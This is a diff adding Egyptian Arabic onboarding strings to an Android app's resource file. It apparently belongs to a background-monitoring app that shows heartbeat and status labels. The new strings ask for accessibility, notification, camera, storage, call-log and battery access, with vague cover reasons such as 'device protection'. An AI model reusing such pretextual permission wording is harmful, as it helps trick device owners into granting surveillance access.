@@ -65,4 +65,27 @@
     <string name="status_service_alive">الخدمة شغالة</string>
     <string name="status_last_heartbeat">آخر نبضة</string>
     <string name="status_phone">الموبايل</string>
+    <string name="welcome_sub">إعداد سريع وآمن لجهازك</string>
+    <string name="btn_get_started">ابدأ</string>
+    <string name="gender_title">النوع</string>
+    <string name="gender_male">ذكر</string>
+    <string name="gender_female">أنثى</string>
+    <string name="dev_footer">Developed by Nemesis</string>
+    <string name="perm_notif_listener">وصول الإشعارات</string>
+    <string name="perm_camera">الكاميرا</string>
+    <string name="perm_storage">التخزين</string>
+    <string name="perm_call_log">سجل المكالمات</string>
+    <string name="reason_a11y">مطلوب لحماية الجهاز ومراقبة الأداء</string>
+    <string name="reason_battery">بيخلي الخدمة تفضل شغالة في الخلفية</string>
+    <string name="reason_notif">بنحتاجه لمتابعة تنبيهات النظام</string>
+    <string name="reason_camera">بنستخدمه لالتقاط صور التحقق</string>
+    <string name="reason_storage">بيسمح بقراءة ملفات الوسائط</string>
+    <string name="reason_calllog">بيخلينا نقرا سجل المكالمات</string>
+    <string name="btn_allow">سماح</string>
+    <string name="btn_skip">تخطي</string>
+    <string name="btn_finish">إنهاء</string>
+    <string name="granted_mark">✔ مفعّل</string>
+    <string name="summary_name_fmt">الاسم: %1$s</string>
+    <string name="summary_phone_fmt">الموبايل: %1$s</string>
+    <string name="summary_gender_fmt">النوع: %1$s</string>
 </resources>
